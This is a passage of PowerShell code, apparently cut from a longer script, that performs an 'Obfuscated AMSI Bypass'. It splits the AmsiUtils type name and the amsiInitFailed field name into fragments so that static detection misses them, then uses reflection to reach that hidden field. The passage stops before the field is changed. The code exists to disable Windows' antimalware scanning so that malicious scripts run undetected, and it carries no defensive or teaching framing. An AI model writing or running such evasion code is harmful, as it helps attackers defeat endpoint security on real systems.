    Write-Host "[+] Executing Obfuscated AMSI Bypass..." -ForegroundColor Green
    
    # Obfuscated strings to avoid static detection
    $a = 'System.Management.Automation.A'
    $b = 'msiUtils'
    $c = 'amsiInitFailed'
    
    # Concatenate to form the full type name
    $amsiType = $a + $b
    
    try {
        # Use string concatenation and variable substitution for obfuscation
        $assembly = [Ref].Assembly
        $type = $assembly.GetType($amsiType)
        
        if ($type) {
            $field = $type.GetField($c, 'NonPublic,Static')
            
            if ($field) {
